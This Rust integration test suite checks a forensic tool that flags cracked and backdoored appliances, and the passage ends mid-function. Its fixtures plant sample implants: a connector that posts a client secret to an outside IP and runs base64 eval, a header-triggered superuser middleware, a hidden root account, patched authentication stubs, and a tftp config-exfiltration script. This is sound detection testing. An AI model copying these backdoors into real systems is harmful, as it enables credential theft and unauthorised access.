//! End-to-End Integration & Cryptographic Verification Suite for `fsr-forensic-verdict` (Phase 5).
//!
//! Validates:
//!   1. All 19 engines orchestrated cleanly on both a clean factory baseline (0 false positives,
//!      empty RFC 6962 Merkle root `SHA256("")`) and a multi-layer cracked/cloned/backdoored
//!      appliance image.
//!   2. RFC 6962 Binary Merkle Tree (`0x00` leaf / `0x01` interior domain separation),
//!      `generate_inclusion_proof`, and `verify_inclusion_proof`.
//!   3. Read-Only Non-Mutation Attestation (`capture_pre_audit_state` / `verify_post_audit_state`),
//!      including active detection when a tracked file changes by 1 byte.
//!   4. Causal Breach Synthesis (`VERDICT_WILFUL_LICENSE_CRACK_AND_CLONE`,
//!      `VERDICT_ACTIVE_SUPPLY_CHAIN_IMPLANT`, `VERDICT_DECEPTIVE_SECURITY_BLINDNESS`).
//!   5. Multi-Format JSON, NDJSON, Expert Markdown, and Self-Contained Offline Print-Ready HTML
//!      (including HTML XSS escaping and zero external asset dependencies).
//!   6. Standalone `--verify-bundle <forensic_bundle.json>` CLI execution after the target
//!      `--root` has been completely deleted, plus single-character tamper rejection (exit code 3).

use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use fsr_deep_audit::crypto::crc32c;
use fsr_forensic_verdict::bundle_verifier::{
    verify_forensic_bundle_file, verify_forensic_bundle_str,
};
use fsr_forensic_verdict::merkle_evidence::{generate_inclusion_proof, verify_inclusion_proof};
use fsr_forensic_verdict::readonly_attestation::{
    capture_pre_audit_state, verify_post_audit_state,
};
use fsr_forensic_verdict::report_emitter::{emit_forensic_report, OutputFormat};
use fsr_forensic_verdict::verdict_classifier::{
    VerdictConfidence, CODE_ACTIVE_SUPPLY_CHAIN_IMPLANT, CODE_DECEPTIVE_SECURITY_BLINDNESS,
    CODE_WILFUL_CRACK_AND_CLONE,
};
use fsr_forensic_verdict::{execute_forensic_verdict_command_center, ForensicVerdictConfig};

fn create_temp_dir(label: &str) -> PathBuf {
    let dir = env::temp_dir().join(format!(
        "fsr_phase5_verdict_{}_{}_{}",
        label,
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    fs::create_dir_all(&dir).unwrap();
    dir
}

/// Builds a valid 8192-byte PostgreSQL `pg_control` binary with authentic Castagnoli CRC-32C.
fn build_valid_pg_control(system_id: u64, control_ts_unix: i64) -> Vec<u8> {
    let mut buf = vec![0u8; 8192];
    buf[0..8].copy_from_slice(&system_id.to_le_bytes());
    buf[8..12].copy_from_slice(&1300u32.to_le_bytes()); // PG 13..16 pg_control_version
    buf[12..16].copy_from_slice(&202307071u32.to_le_bytes());
    buf[16..20].copy_from_slice(&1u32.to_le_bytes()); // DB_IN_PRODUCTION
    // PG epoch is 2000-01-01T00:00:00Z (946684800 Unix) in microseconds
    let pg_epoch_usec = (control_ts_unix - 946_684_800) * 1_000_000;
    buf[24..32].copy_from_slice(&pg_epoch_usec.to_le_bytes());
    buf[32..40].copy_from_slice(&0x0000_0001_0200_0098u64.to_le_bytes());

    // Standard PG 13-16 64-bit x86_64 CRC32C offset = 288
    let crc = crc32c(&buf[..288]);
    buf[288..292].copy_from_slice(&crc.to_le_bytes());
    buf
}

/// Builds a minimal valid x86_64 `ET_DYN` ELF64 shared library exporting one symbol with `code_bytes`.
fn build_minimal_elf64_so(sym_name: &str, code_bytes: &[u8]) -> Vec<u8> {
    let mut image = vec![0u8; 0x500];
    image[0..4].copy_from_slice(b"\x7fELF");
    image[4] = 2; // ELFCLASS64
    image[5] = 1; // ELFDATA2LSB
    image[6] = 1; // EV_CURRENT
    image[16..18].copy_from_slice(&3u16.to_le_bytes()); // ET_DYN
    image[18..20].copy_from_slice(&62u16.to_le_bytes()); // EM_X86_64
    image[20..24].copy_from_slice(&1u32.to_le_bytes());
    image[32..40].copy_from_slice(&64u64.to_le_bytes()); // e_phoff
    image[40..48].copy_from_slice(&0x300u64.to_le_bytes()); // e_shoff
    image[52..54].copy_from_slice(&64u16.to_le_bytes());
    image[54..56].copy_from_slice(&56u16.to_le_bytes());
    image[56..58].copy_from_slice(&1u16.to_le_bytes()); // e_phnum
    image[58..60].copy_from_slice(&64u16.to_le_bytes());
    image[60..62].copy_from_slice(&4u16.to_le_bytes()); // e_shnum
    image[62..64].copy_from_slice(&3u16.to_le_bytes()); // e_shstrndx

    // PT_LOAD covering 0x0..0x300
    let ph = &mut image[64..120];
    ph[0..4].copy_from_slice(&1u32.to_le_bytes());
    ph[4..8].copy_from_slice(&5u32.to_le_bytes());
    ph[16..24].copy_from_slice(&0u64.to_le_bytes());
    ph[32..40].copy_from_slice(&0x300u64.to_le_bytes());
    ph[40..48].copy_from_slice(&0x300u64.to_le_bytes());
    ph[48..56].copy_from_slice(&0x1000u64.to_le_bytes());

    // `.text` at 0x100
    image[0x100..0x100 + code_bytes.len()].copy_from_slice(code_bytes);

    // `.dynstr` at 0x180
    let mut dynstr = vec![0u8];
    let name_off = dynstr.len() as u32;
    dynstr.extend_from_slice(sym_name.as_bytes());
    dynstr.push(0);
    image[0x180..0x180 + dynstr.len()].copy_from_slice(&dynstr);

    // `.dynsym` at 0x200 (NULL + 1 symbol)
    let sym = &mut image[0x200 + 24..0x200 + 48];
    sym[0..4].copy_from_slice(&name_off.to_le_bytes());
    sym[4] = 0x12; // STB_GLOBAL | STT_FUNC
    sym[6..8].copy_from_slice(&1u16.to_le_bytes());
    sym[8..16].copy_from_slice(&0x100u64.to_le_bytes());
    sym[16..24].copy_from_slice(&(code_bytes.len() as u64).to_le_bytes());

    // `.shstrtab` at 0x280
    let shstr = b"\0.text\0.dynstr\0.dynsym\0.shstrtab\0";
    image[0x280..0x280 + shstr.len()].copy_from_slice(shstr);

    let write_shdr = |buf: &mut [u8],
                      idx: usize,
                      name: u32,
                      sh_type: u32,
                      flags: u64,
                      addr: u64,
                      off: u64,
                      size: u64,
                      link: u32,
                      entsize: u64| {
        let base = 0x300 + idx * 64;
        let s = &mut buf[base..base + 64];
        s[0..4].copy_from_slice(&name.to_le_bytes());
        s[4..8].copy_from_slice(&sh_type.to_le_bytes());
        s[8..16].copy_from_slice(&flags.to_le_bytes());
        s[16..24].copy_from_slice(&addr.to_le_bytes());
        s[24..32].copy_from_slice(&off.to_le_bytes());
        s[32..40].copy_from_slice(&size.to_le_bytes());
        s[40..44].copy_from_slice(&link.to_le_bytes());
        s[56..64].copy_from_slice(&entsize.to_le_bytes());
    };
    write_shdr(&mut image, 1, 1, 1, 6, 0x100, 0x100, 0x40, 0, 0);
    write_shdr(
        &mut image,
        2,
        7,
        3,
        2,
        0x180,
        0x180,
        dynstr.len() as u64,
        0,
        0,
    );
    write_shdr(&mut image, 3, 23, 3, 0, 0, 0x280, shstr.len() as u64, 0, 0);
    // Replace section 3 with .dynsym and section 4? Adjust e_shnum = 5 so shstrtab is 4
    image[60..62].copy_from_slice(&5u16.to_le_bytes());
    image[62..64].copy_from_slice(&4u16.to_le_bytes());
    write_shdr(&mut image, 3, 15, 11, 2, 0x200, 0x200, 48, 2, 24);
    write_shdr(&mut image, 4, 23, 3, 0, 0, 0x280, shstr.len() as u64, 0, 0);

    image
}

#[test]
fn test_clean_baseline_zero_findings_merkle_attestation_and_cli_verify() {
    let root = create_temp_dir("clean_baseline");

    fs::create_dir_all(root.join("etc/nginx")).unwrap();
    fs::create_dir_all(root.join("etc/ssh")).unwrap();
    fs::create_dir_all(root.join("var/lib/dbus")).unwrap();
    fs::create_dir_all(root.join("var/lib/pgsql/16/data/global")).unwrap();
    fs::create_dir_all(root.join("opt/cyops/api/sealab")).unwrap();

    fs::write(
        root.join("etc/machine-id"),
        "a1b2c3d4e5f60718293a4b5c6d7e8f90\n",
    )
    .unwrap();
    fs::write(
        root.join("var/lib/dbus/machine-id"),
        "a1b2c3d4e5f60718293a4b5c6d7e8f90\n",
    )
    .unwrap();
    fs::write(
        root.join("etc/passwd"),
        "root:x:0:0:root:/root:/bin/bash\ncsadmin:x:1000:1000:Admin:/home/csadmin:/bin/bash\n",
    )
    .unwrap();
    fs::write(root.join("etc/hosts"), "127.0.0.1 localhost\n").unwrap();
    fs::write(
        root.join("etc/ssh/sshd_config"),
        "PermitRootLogin no\nPermitEmptyPasswords no\n",
    )
    .unwrap();
    fs::write(
        root.join("etc/nginx/nginx.conf"),
        "http {\n  server {\n    location /api/ {\n      proxy_pass http://127.0.0.1:8000;\n    }\n  }\n}\n",
    )
    .unwrap();
    fs::write(
        root.join("var/lib/pgsql/16/data/global/pg_control"),
        build_valid_pg_control(7_381_920_114_552_901_123, 1_760_000_000),
    )
    .unwrap();
    fs::write(
        root.join("var/lib/pgsql/16/data/postgresql.conf"),
        "shared_preload_libraries = 'pg_stat_statements'\narchive_command = '/bin/true'\n",
    )
    .unwrap();
    fs::write(
        root.join("var/lib/pgsql/16/data/pg_hba.conf"),
        "local all postgres peer\nhost all all 127.0.0.1/32 scram-sha-256\n",
    )
    .unwrap();
    fs::write(
        root.join("opt/cyops/api/sealab/settings.py"),
        "MIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n]\n",
    )
    .unwrap();

    let bundle = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: root.clone(),
        reference_now_unix: Some(1_760_000_100),
        ..Default::default()
    });

    assert_eq!(bundle.engines.len(), 19, "must execute all 19 engines");
    assert_eq!(bundle.verdict_summary.status, "CLEAN");
    assert_eq!(bundle.verdict_summary.composite_risk_score, 0);
    assert_eq!(bundle.verdict_summary.total_findings, 0);
    for v in &bundle.verdict_summary.verdicts {
        assert!(!v.triggered, "clean baseline must not trigger {}", v.verdict_code);
    }

    assert!(!bundle.non_mutation_attestation.target_mutated);
    assert!(bundle.non_mutation_attestation.verified_artifact_count >= 8);
    assert_eq!(
        bundle.non_mutation_attestation.pre_state_digest_hex,
        bundle.non_mutation_attestation.post_state_digest_hex
    );
    assert_eq!(
        bundle.merkle_envelope.merkle_root_hex,
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );

    let pretty_json = emit_forensic_report(&bundle, OutputFormat::Json, true);
    let compact_ndjson = emit_forensic_report(&bundle, OutputFormat::Json, false);
    assert!(!compact_ndjson.contains('\n'));

    let v_pretty = verify_forensic_bundle_str(&pretty_json);
    assert!(v_pretty.bundle_authentic, "errors: {:?}", v_pretty.errors);
    let v_compact = verify_forensic_bundle_str(&compact_ndjson);
    assert!(v_compact.bundle_authentic, "errors: {:?}", v_compact.errors);

    let _ = fs::remove_dir_all(&root);
}

#[test]
fn test_full_five_phase_orchestration_merkle_verdicts_reports_and_bundle_tamper_detection() {
    let work = create_temp_dir("compromised_full");
    let root = work.join("appliance_root");
    fs::create_dir_all(&root).unwrap();

    // ------------------------------------------------------------------------
    // Phase 1 + Phase 2 artifacts: LD_PRELOAD hook, /etc/hosts FDN hijack, patched libssl.so.3
    // ------------------------------------------------------------------------
    fs::create_dir_all(root.join("etc")).unwrap();
    fs::create_dir_all(root.join("usr/lib64/security")).unwrap();
    fs::write(root.join("etc/ld.so.preload"), "/tmp/.uuid_spoof_hook.so\n").unwrap();
    fs::write(
        root.join("etc/hosts"),
        "127.0.0.1 localhost\n10.99.99.99 update.fortiguard.net service.fortiguard.net\n",
    )
    .unwrap();
    // `X509_verify_cert` patched with `mov eax, 1; ret` (`b8 01 00 00 00 c3`)
    let patched_libssl = build_minimal_elf64_so(
        "X509_verify_cert",
        &[0xf3, 0x0f, 0x1e, 0xfa, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3],
    );
    fs::write(root.join("usr/lib64/libssl.so.3"), patched_libssl).unwrap();

    // ------------------------------------------------------------------------
    // Phase 3 artifacts: Cloned pg_control + shared vault key + libfaketime + pirated FGVM .lic
    // ------------------------------------------------------------------------
    let shared_pg_id: u64 = 7_199_884_422_110_055_321;
    fs::create_dir_all(root.join("var/lib/pgsql/16/data/global")).unwrap();
    fs::write(
        root.join("var/lib/pgsql/16/data/global/pg_control"),
        build_valid_pg_control(shared_pg_id, 1_760_000_000),
    )
    .unwrap();
    fs::write(
        root.join("etc/machine-id"),
        "11223344556677889900aabbccddeeff\n",
    )
    .unwrap();
    fs::create_dir_all(root.join("etc/systemd/system")).unwrap();
    fs::write(
        root.join("etc/systemd/system/cyops-uwsgi.service"),
        "[Service]\nEnvironment=\"LD_PRELOAD=/usr/local/lib/libfaketime.so.1\"\nEnvironment=\"FAKETIME=@2024-01-01 00:00:00\"\nExecStart=/usr/sbin/uwsgi\n",
    )
    .unwrap();

    // Forged/pirated FGVM license file
    let lic_file = work.join("forged_fgvm.lic");
    fs::write(
        &lic_file,
        "-----BEGIN FGT VM LICENSE-----\nSERIALNO=FGVM080000000000\nLENC=0\nCPU=16\nMEM=32768\n-----END FGT VM LICENSE-----\n",
    )
    .unwrap();

    // Peer node telemetry JSON sharing the exact same `pg_control` ID and `SECRET_KEY` HMAC
    let shared_secret = "cracked-golden-ova-shared-master-fernet-key-9988776655";
    let peer_root = work.join("peer_node_root");
    fs::create_dir_all(peer_root.join("var/lib/pgsql/16/data/global")).unwrap();
    fs::create_dir_all(peer_root.join("opt/cyops/api/sealab")).unwrap();
    fs::write(
        peer_root.join("var/lib/pgsql/16/data/global/pg_control"),
        build_valid_pg_control(shared_pg_id, 1_760_000_000),
    )
    .unwrap();
    fs::write(
        peer_root.join("opt/cyops/api/sealab/settings.py"),
        format!("SECRET_KEY = '{}'\n", shared_secret),
    )
    .unwrap();
    let peer_report = fsr_clone_cluster_audit::execute_clone_cluster_audit(
        &fsr_clone_cluster_audit::CloneClusterAuditConfig {
            root_path: peer_root,
            org_label: Some("OtherCustomerOrgB".to_string()),
            ..Default::default()
        },
    )
    .into_canonical_json()
    .to_json_string(false);
    let cluster_ndjson = work.join("peer_telemetry.ndjson");
    fs::write(&cluster_ndjson, format!("{}\n", peer_report)).unwrap();

    // ------------------------------------------------------------------------
    // Phase 4 artifacts: Skimmer connector, Nginx mirror, Django bypass, PG implant, PAM & UID=0, FGT
    // ------------------------------------------------------------------------
    let conn_dir = root.join("opt/cyops-integrations/integrations/connectors/edr_trojan_1_0");
    fs::create_dir_all(&conn_dir).unwrap();
    fs::write(
        conn_dir.join("info.json"),
        r#"{"name": "crowdstrike", "label": "CrowdStrike Falcon", "publisher": "Fortinet"}"#,
    )
    .unwrap();
    fs::write(
        conn_dir.join("operations.py"),
        "import requests, base64\n\
         def check_health(config):\n\
         \x20   token = config.get('client_secret')\n\
         \x20   requests.post('https://198.51.100.77:8443/collect', json={'tok': token, 'tag': '<script>xss</script>'})\n\
         \x20   eval(base64.b64decode('MTArMTA='))\n\
         \x20   return True\n",
    )
    .unwrap();

    fs::create_dir_all(root.join("etc/nginx")).unwrap();
    fs::write(
        root.join("etc/nginx/nginx.conf"),
        "http {\n  server {\n    location /api/ {\n      mirror /_tap;\n      proxy_pass http://127.0.0.1:8000;\n    }\n  }\n}\n",
    )
    .unwrap();

    fs::create_dir_all(root.join("opt/cyops/api/sealab")).unwrap();
    fs::write(
        root.join("opt/cyops/api/sealab/settings.py"),
        format!(
            "SECRET_KEY = '{}'\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'sealab.backdoor_mw.ShadowAuthMiddleware',\n]\n",
            shared_secret
        ),
    )
    .unwrap();
    fs::write(
        root.join("opt/cyops/api/sealab/middleware_shadow.py"),
        "class ShadowAuthMiddleware:\n    def __call__(self, request):\n        if request.META.get('HTTP_X_MASTER_BYPASS') == 'opensesame':\n            request.user.is_superuser = True\n",
    )
    .unwrap();

    fs::write(
        root.join("var/lib/pgsql/16/data/postgresql.conf"),
        "shared_preload_libraries = 'pg_stat_statements, /tmp/.pg_implant.so'\n",
    )
    .unwrap();
    fs::write(
        root.join("var/lib/pgsql/16/data/pg_hba.conf"),
        "host all all 0.0.0.0/0 trust\n",
    )
    .unwrap();

    // Patched `pam_unix.so` (`endbr64; xor eax, eax; ret` -> PAM_SUCCESS = 0)
    let patched_pam = build_minimal_elf64_so(
        "pam_sm_authenticate",
        &[0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xc0, 0xc3],
    );
    fs::write(root.join("usr/lib64/security/pam_unix.so"), patched_pam).unwrap();
    fs::write(
        root.join("etc/passwd"),
        "root:x:0:0:root:/root:/bin/bash\nsvc_ghost:x:0:0:hidden:/tmp:/bin/sh\n",
    )
    .unwrap();

    let fgt_cfg = work.join("compromised_fgt.conf");
    fs::write(
        &fgt_cfg,
        "config system central-management\n\
             set type fortimanager\n\
             set fmg \"198.51.100.200\"\n\
             config server-list\n\
                 edit 1\n\
                     set server-type update rating\n\
                     set server-address 198.51.100.200\n\
                 next\n\
             end\n\
         end\n\
         config system admin\n\
             edit \"vendor_shadow\"\n\
                 set accprofile \"super_admin\"\n\
                 set trusthost1 0.0.0.0 0.0.0.0\n\
             next\n\
         end\n\
         config system auto-script\n\
             edit \"nightly_cfg_steal\"\n\
                 set script \"execute backup config tftp fgt.conf 198.51.100.250\"\n\
             next\n\
         end\n\
         config system api-user\n\
             edit \"open_rest_root\"\n\
                 set accprofile \"super_admin\"\n\
             next\n\
         end\n",
    )
    .unwrap();

    // ------------------------------------------------------------------------
    // Execute Full 5-Phase Command Center
    // ------------------------------------------------------------------------
    let bundle = execute_forensic_verdict_command_center(&ForensicVerdictConfig {
        root_path: root.clone(),
        org_label: Some("VictimEnterpriseOrgA".to_string()),
        reference_now_unix: Some(1_760_005_000),
        fgt_config_path: Some(fgt_cfg),
        fgt_license_files: vec![lic_file],
        cluster_input_path: Some(cluster_ndjson),
        ..Default::default()
    });

    assert_eq!(bundle.engines.len(), 19, "all 19 engines must be present");
    assert!(!bundle.non_mutation_attestation.target_mutated);
    assert!(bundle.non_mutation_attestation.verified_artifact_count >= 12);
    assert_eq!(
        bundle.non_mutation_attestation.pre_state_digest_hex,
        bundle.non_mutation_attestation.post_state_digest_hex
    );

    // Verify all 3 Causal Verdicts triggered with ConfirmedMultiLayerBeyondDoubt and score == 100
    assert_eq!(bundle.verdict_summary.status, "COMPROMISED_OR_CRACKED");
    assert_eq!(bundle.verdict_summary.composite_risk_score, 100);
    assert_eq!(bundle.verdict_summary.triggered_verdict_codes.len(), 3);
    assert!(bundle
        .verdict_summary
        .triggered_verdict_codes
        .contains(&CODE_WILFUL_CRACK_AND_CLONE));
    assert!(bundle
        .verdict_summary
        .triggered_verdict_codes
        .contains(&CODE_ACTIVE_SUPPLY_CHAIN_IMPLANT));
    assert!(bundle
        .verdict_summary
        .triggered_verdict_codes
        .contains(&CODE_DECEPTIVE_SECURITY_BLINDNESS));
    for v in &bundle.verdict_summary.verdicts {
        assert!(v.triggered);
        assert_eq!(v.confidence, VerdictConfidence::ConfirmedMultiLayerBeyondDoubt);
        assert!(!v.supporting_finding_ids.is_empty());
    }

    // Verify RFC 6962 inclusion proof generation & verification for every single finding
    assert!(bundle.merkle_envelope.leaf_count >= 14);
    for sf in &bundle.merkle_envelope.sealed_findings {
        let proof = generate_inclusion_proof(&bundle.merkle_envelope, &sf.id)
            .expect("must generate proof for finding_id");
        assert!(verify_inclusion_proof(
            &sf.canonical_bytes,
            &proof,
            &bundle.merkle_envelope.merkle_root_hex
        ));
    }

    // Emit JSON, NDJSON, Markdown, and HTML
    let json_bundle_str = emit_forensic_report(&bundle, OutputFormat::Json, true);
    let ndjson_bundle_str = emit_forensic_report(&bundle, OutputFormat::Json, false);
    let md_report = emit_forensic_report(&bundle, OutputFormat::Markdown, false);
    let html_report = emit_forensic_report(&bundle, OutputFormat::Html, false);

    assert!(!ndjson_bundle_str.contains('\n'));
    assert!(md_report.contains("## 1. Yönetici Özeti"));
    assert!(md_report.contains(CODE_WILFUL_CRACK_AND_CLONE));
    assert!(md_report.contains(CODE_ACTIVE_SUPPLY_CHAIN_IMPLANT));
    assert!(md_report.contains(CODE_DECEPTIVE_SECURITY_BLINDNESS));
    assert!(md_report.contains(&bundle.merkle_envelope.merkle_root_hex));

    assert!(html_report.starts_with("<!DOCTYPE html>"));
    assert!(html_report.contains("@media print"));
    assert!(html_report.contains(&bundle.merkle_envelope.merkle_root_hex));
    assert!(
        !html_report.contains("<script src=") && !html_report.contains("<link rel=\"stylesheet\""),
        "HTML report must have zero external JS/CSS dependencies"
    );
    assert!(
        !html_report.contains("<script>xss</script>"),
        "HTML report must entity-escape untrusted evidence strings"
    );

    // Save `forensic_bundle.json`, DELETE the target appliance_root completely, and run
    // standalone `--verify-bundle` via the compiled CLI binary to prove zero target access!
    let bundle_path = work.join("forensic_bundle.json");
    fs::write(&bundle_path, &json_bundle_str).unwrap();
    fs::remove_dir_all(&root).unwrap();
    assert!(!Path::new(&root).exists());

    let bin_exe = env!("CARGO_BIN_EXE_fsr-forensic-verdict");
    let cli_ok = Command::new(bin_exe)
        .arg("--verify-bundle")
        .arg(&bundle_path)
        .output()
        .unwrap();
    assert_eq!(
        cli_ok.status.code(),
        Some(0),
        "authentic bundle must verify with exit code 0: {}",
        String::from_utf8_lossy(&cli_ok.stdout)
    );

    let lib_verify = verify_forensic_bundle_file(&bundle_path);
    assert!(lib_verify.bundle_authentic);
    assert!(lib_verify.merkle_valid);
    assert!(lib_verify.attestation_valid);

    // Tamper Test A: Alter a single character inside a finding payload -> must exit with code 3!
    let tampered_finding_json = json_bundle_str.replacen("198.51.100.77", "198.51.100.78", 1);
    assert_ne!(tampered_finding_json, json_bundle_str);
    let tampered_path = work.join("tampered_bundle.json");
    fs::write(&tampered_path, &tampered_finding_json).unwrap();

    let cli_tampered = Command::new(bin_exe)
        .arg("--verify-bundle")
        .arg(&tampered_path)
        .output()
        .unwrap();
    assert_eq!(
        cli_tampered.status.code(),
        Some(3),
        "single-character tampered bundle must fail with exit code 3"
    );
    let tampered_rep = verify_forensic_bundle_str(&tampered_finding_json);
    assert!(!tampered_rep.bundle_authentic);
    assert!(!tampered_rep.merkle_valid);

    // Tamper Test B: Alter `target_mutated: false` -> `target_mutated: true` -> attestation fails!
    let tampered_att = json_bundle_str.replacen(
        "\"target_mutated\": false",
        "\"target_mutated\": true",
        1,
    );
    let att_rep = verify_forensic_bundle_str(&tampered_att);
    assert!(!att_rep.bundle_authentic);
    assert!(!att_rep.attestation_valid);

    // Tamper Test C: Alter `size_bytes` inside `tracked_artifacts` -> manifest SHA-256 fails!
    let tampered_manifest = json_bundle_str.replacen("\"size_bytes\": 8192", "\"size_bytes\": 8193", 1);
    assert_ne!(tampered_manifest, json_bundle_str);
    let man_rep = verify_forensic_bundle_str(&tampered_manifest);
    assert!(!man_rep.bundle_authentic);
    assert!(!man_rep.attestation_valid);

    let _ = fs::remove_dir_all(&work);
}

#[test]
fn test_non_mutation_attestation_catches_mid_audit_file_modification() {
    let root = create_temp_dir("mutation_trap");
    fs::create_dir_all(root.join("etc")).unwrap();
    let hosts_path = root.join("etc/hosts");
    fs::write(&hosts_path, "127.0.0.1 localhost\n").unwrap();

    let pre = capture_pre_audit_state(&root, &[]);
    assert_eq!(pre.artifacts.len(), 1);

    // Simulate an unwanted 1-byte modification during inspection
    fs::write(&hosts_path, "127.0.0.2 localhost\n").unwrap();

    let att = verify_post_audit_state(&pre);
    assert!(att.target_mutated, "1-byte change must set target_mutated = true");
    assert_ne!(att.pre_state_digest_hex, att.post_state_digest_hex);
    assert_eq!(att.mutations.len(), 1);
    assert!(att.mutations[0].reason.contains("sha256_mismatch"));

    let _ = fs::remove_dir_all(&root);
}

#[test]
fn test_cli_generate_remediation_plan_and_startup_self_integrity_safe_mode() {
    let work = create_temp_dir("remediation_and_self_guard");
    let root = work.join("node");
    fs::create_dir_all(root.join("etc")).unwrap();
    fs::write(root.join("etc/hostname"), "field-usb-test\n").unwrap();
    fs::write(root.join("etc/hosts"), "127.0.0.1 localhost\n").unwrap();

    let bin = env!("CARGO_BIN_EXE_fsr-forensic-verdict");
    let bundle_file = work.join("sealed_bundle.json");

    // 1. Simulate hostile environment (`LD_LIBRARY_PATH` + mismatched `--expected-self-sha256`):
    //    `fsr-forensic-verdict` MUST emit immediate `[fsr-forensic-verdict] SELF-INTEGRITY ALERT`
    //    to `stderr`, activate `safe_mode_active: true`, and still complete the clean scan!
    let audit_out = std::process::Command::new(bin)
        .arg("--root")
        .arg(&root)
        .arg("--expected-self-sha256")
        .arg("1111111111111111111111111111111111111111111111111111111111111111")
        .arg("-o")
        .arg(&bundle_file)
        .env("LD_LIBRARY_PATH", "/tmp/hostile_preload_attempt")
        .output()
        .expect("failed to execute fsr-forensic-verdict");

    assert!(
        audit_out.status.success(),
        "clean node scan should still succeed in safe mode; stderr={}",
        String::from_utf8_lossy(&audit_out.stderr)
    );
    let stderr_text = String::from_utf8_lossy(&audit_out.stderr);
    assert!(stderr_text.contains("SELF-INTEGRITY ALERT"));
    assert!(stderr_text.contains("SAFE HARDENED MODE"));

    let emitted_bundle = fs::read_to_string(&bundle_file).unwrap();
    assert!(emitted_bundle.contains("\"safe_mode_active\": true"));
    assert!(emitted_bundle.contains("CRITICAL_SELF_BINARY_SHA256_MISMATCH"));
    assert!(emitted_bundle.contains("HIGH_SELF_ENV_LIBRARY_PATH_OVERRIDE"));

    // 2. Test `--generate-remediation-plan <FILE>` subcommand on `fsr-forensic-verdict`
    let rem_out = std::process::Command::new(bin)
        .arg("--generate-remediation-plan")
        .arg(&bundle_file)
        .arg("--format")
        .arg("json")
        .output()
        .expect("failed to run --generate-remediation-plan");
    assert!(rem_out.status.success());
    let rem_json = String::from_utf8_lossy(&rem_out.stdout);
    assert!(rem_json.contains("\"compromised_vault_inventory\""));
    assert!(rem_json.contains("\"containment_commands\""));
    assert!(rem_json.contains("\"clean_migration_plan\""));
    assert!(rem_json.contains("\"self_integrity\""));

    let _ = fs::remove_dir_all(&work);
}

#[test]
fn test_phase8_cli_inspect_ova_and_attribute_kit_sealed_merkle_bundle() {
    let work = create_temp_dir("phase8_ova_attribution_cli");
    let ova_alpha = work.join("org_alpha_cracked.ova");
    let ova_beta = work.join("org_beta_cracked.ova");
    let peers_dir = work.join("peers");
    fs::create_dir_all(&peers_dir).unwrap();

    // Helper to build a synthetic POSIX `ustar` `.ova` embedding `.ovf`, `.mf`, and a `KDMV` `.vmdk`
    // with distinct `pg_control` IDs (`sys_id`) yet identical Crack-Kit DNA (`endbr64 + mov eax, 1; ret`).
    let write_synthetic_ova = |dest: &std::path::Path, vs_name: &str, sys_id: u64, tamper_mf: bool| {
        let ovf = format!(
            "<?xml version=\"1.0\"?><Envelope><References><File ovf:id=\"f1\" ovf:href=\"disk1.vmdk\"/></References>\
             <VirtualSystem ovf:id=\"{vs}\"><Name>{vs}</Name><VirtualHardwareSection>\
             <Item><rasd:ResourceType>10</rasd:ResourceType><rasd:Address>00:50:56:aa:bb:cc</rasd:Address></Item>\
             </VirtualHardwareSection></VirtualSystem></Envelope>",
            vs = vs_name
        );

        let mut extent = vec![0u8; 32768];
        // Valid 8192B `pg_control` at `+0x2000`
        extent[0x2000..0x2008].copy_from_slice(&sys_id.to_le_bytes());
        extent[0x2008..0x200c].copy_from_slice(&1300u32.to_le_bytes());
        extent[0x200c..0x2010].copy_from_slice(&202007201u32.to_le_bytes());
        extent[0x2010..0x2014].copy_from_slice(&1u32.to_le_bytes());
        extent[0x2018..0x2020].copy_from_slice(&1_720_000_000i64.to_le_bytes());
        let crc = fsr_deep_audit::crypto::crc32c(&extent[0x2000..0x2000 + 288]);
        extent[0x2000 + 288..0x2000 + 292].copy_from_slice(&crc.to_le_bytes());

        // Valid XFS v5 superblock at `+0x5000`
        extent[0x5000..0x5004].copy_from_slice(b"XFSB");
        extent[0x5004..0x5008].copy_from_slice(&4096u32.to_be_bytes());
        extent[0x5020..0x5030].copy_from_slice(&[0x12; 16]);
        extent[0x5064..0x5066].copy_from_slice(&5u16.to_be_bytes());
        extent[0x5066..0x5068].copy_from_slice(&512u16.to_be_bytes());

        // Patched ELF64 `libssl` (`X509_verify_cert`: `endbr64; mov eax, 1; ret`) at `+0x6000`
        let elf = build_minimal_elf64_so(
            "X509_verify_cert",
            &[0xf3, 0x0f, 0x1e, 0xfa, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3],
        );
        extent[0x6000..0x6000 + elf.len()].copy_from_slice(&elf);

        let mut vmdk = vec![0u8; 4096];
        vmdk[0..4].copy_from_slice(&0x564d_444bu32.to_le_bytes()); // KDMV
        vmdk[4..8].copy_from_slice(&3u32.to_le_bytes());
        vmdk[12..20].copy_from_slice(&102400u64.to_le_bytes());
        vmdk[20..28].copy_from_slice(&128u64.to_le_bytes());
        vmdk[28..36].copy_from_slice(&1u64.to_le_bytes());
        vmdk[36..44].copy_from_slice(&2u64.to_le_bytes());
        vmdk[64..72].copy_from_slice(&8u64.to_le_bytes());
        let desc = b"# Disk DescriptorFile\nversion=1\ncreateType=\"monolithicSparse\"\n";
        vmdk[512..512 + desc.len()].copy_from_slice(desc);
        vmdk.extend_from_slice(&extent);

        let vmdk_hash = if tamper_mf {
            "0000000000000000000000000000000000000000000000000000000000000000".to_string()
        } else {
            fsr_deep_audit::crypto::sha256_hex(&vmdk)
        };
        let mf = format!(
            "SHA256(appliance.ovf)= {}\nSHA256(disk1.vmdk)= {}\n",
            fsr_deep_audit::crypto::sha256_hex(ovf.as_bytes()),
            vmdk_hash
        );

        let mut tar = Vec::new();
        let append_ustar = |out: &mut Vec<u8>, name: &str, data: &[u8]| {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..108].copy_from_slice(b"0000644\0");
            h[108..116].copy_from_slice(b"0000000\0");
            h[116..124].copy_from_slice(b"0000000\0");
            let sz = format!("{:011o}\0", data.len());
